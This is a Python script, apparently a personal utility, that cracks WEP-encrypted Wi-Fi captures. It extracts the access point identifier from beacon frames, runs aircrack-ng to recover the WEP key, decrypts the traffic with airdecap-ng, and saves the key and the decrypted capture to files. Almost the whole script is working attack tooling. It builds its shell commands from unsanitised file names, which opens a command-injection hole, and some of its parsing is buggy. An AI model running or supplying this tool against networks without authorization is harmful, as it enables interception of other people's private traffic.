#!/usr/bin/python
# coding:UTF-8

# ------------------------------------------------------------------------------------- #
#      PYTHON UTILITY FILE TO CRACK ENCRYPTED .PCAP FILES CAPTURED BY WIRESHARK         #
#                BY TERENCE BROADBENT BSC CYBERSECURITY (FIRST CLASS)                   #
# ------------------------------------------------------------------------------------- #
# This is a script that has been borrowed, and translated to python3, from the original #
# ------------------------------------------------------------------------------------- #
# AUTHOR  : Terence Broadbent                                                           #
# ------------------------------------------------------------------------------------- #

import os
import platform
import sys
import colorlog
import shutil

# Configure colorlog for logging messages with colors
logger = colorlog.getLogger()
logger.setLevel(colorlog.DEBUG)

handler = colorlog.StreamHandler()
formatter = colorlog.ColoredFormatter(
    "%(log_color)s%(levelname)-8s%(reset)s %(blue)s%(message)s",
    datefmt=None,
    reset=True,
    log_colors={
        "DEBUG": "cyan",
        "INFO": "green",
        "WARNING": "yellow",
        "ERROR": "red",
        "CRITICAL": "red",
    },
)
handler.setFormatter(formatter)
logger.addHandler(handler)

if platform.system() != "Linux":
    colorlog.critical("This script is only compatible with Linux.")
    exit(1)

os.system("clear")

print(r"""
 " ____   ____    _    ____     ____ ____      _    ____ _  _______ ____   "
 "|  _ \ / ___|  / \  |  _ \   / ___|  _ \    / \  / ___| |/ / ____|  _ \  "
 "| |_) | |     / _ \ | |_) | | |   | |_) |  / _ \| |   | ' /|  _| | |_) | "
 "|  __/| |___ / ___ \|  __/  | |___|  _ <  / ___ \ |___| . \| |___|  _ <  "
 "|_|    \____/_/   \_\_|      \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\ "
 "                                                                         "
""")

try:
    if os.geteuid() != 0:
        colorlog.critical("Please run this python script as root...")
        exit(1)

    if len(sys.argv) < 2:
        colorlog.critical("Use the command python cracker.py file.pcap")
        exit(1)

    filename = sys.argv[1]

    if os.path.exists(filename) == 0:
        colorlog.critical(f"File {filename} was not found, did you spell it correctly?")
        exit(1)

    checklist = ["airmon-ng", "tshark", "editcap", "pcapfix"]
    installed = True

    for check in checklist:
        cmd = "locate -i " + check + " > /dev/null"
        checked = os.system(cmd)
        if checked != 0:
            colorlog.warning("I could not find {check} in the system...")
            installed = False

    if not installed:
        colorlog.critical("Install those missing dependencies before you begin...")
        exit(1)

    new_filetype = filename[:-2]
    typetest = filename[-6:]

    colorlog.debug("Filename: " + filename)
    colorlog.debug("File Format: " + typetest)

    if typetest == "pcapng":
        colorlog.info("Crack Status: Converting file format...")
        os.system("editcap -F pcap '" + filename + "' '" + new_filetype + "' > /dev/null")
        filename = filename[:-2]
        colorlog.debug("New Filename: " + filename)

    os.system("pcapfix -d '" + filename + "' -o Fixerror.pcap > /dev/null")

    if os.path.isfile('./Fixerror.pcap') != 0:
        os.rename(filename, "Oldpcapfile.pcap")
        os.rename("Fixerror.pcap", filename)
        colorlog.info(f"Crack Status: Fixing file errors for {filename}..")
        colorlog.debug("Original Renamed: Oldpcapfile.pcap")

    print('-' * 100)
    cmd = "tcpdump -ennr '" + filename + "' '(type mgt subtype beacon)' | awk '{print $13}' | sed 's/[()]//g;s/......//' | sort | uniq > SSID.txt"
    os.system(cmd)
    print('-' * 100)

    ssid = open("SSID.txt").readline().rstrip()
    os.remove('./SSID.txt')
    ssid = "00:" + ssid

    if ssid == "00:":
        colorlog.critical(f"Empty SSID: The ssid {ssid} was given, This is not allowed...")
        exit(1)
    else:
        colorlog.info(f"Service Set Id: {ssid}")

    os.system("aircrack-ng -b " + ssid + " '" + filename + "' > Answer.txt")
    os.system("awk '/KEY FOUND!/{print $(NF-1)}' Answer.txt > WepKey.txt")
    os.remove('./Answer.txt')
    wep = open("WepKey.txt").readline().rstrip()
    os.remove("./WepKey.txt")
    colorlog.info("Wired Privacy Key : " + wep)

    os.system("airdecap-ng -w " + wep + " '" + filename + "' " + "> /dev/null")
    filename2 = filename[:-5]
    filename2 += "-dec.pcap"

    # Create the CRACKED directory if it doesn't exist
    if not os.path.exists('CRACKED'):
        os.makedirs('CRACKED')

    # Move the file into the CRACKED directory
    shutil.move(filename2, f'CRACKED/{filename2}')

    # Rename the file within the CRACKED directory to include the SSID
    new_filename = f'Cracked_{ssid}.pcap'
    os.rename(f'CRACKED/{filename2}', f'CRACKED/{new_filename}')
    colorlog.info(f"Renamed Cracked File: {new_filename}")

    with open(f'Cracked_{ssid}_DATA.txt', 'w') as data_file:
        data_file.write(f"SSID: {ssid}")
        data_file.write(f"\nWEP KEY: {wep}")
    colorlog.info(f"Saved Data File: Cracked_{ssid}_DATA.txt with all details collected")

except Exception as e:
    colorlog.error(e)
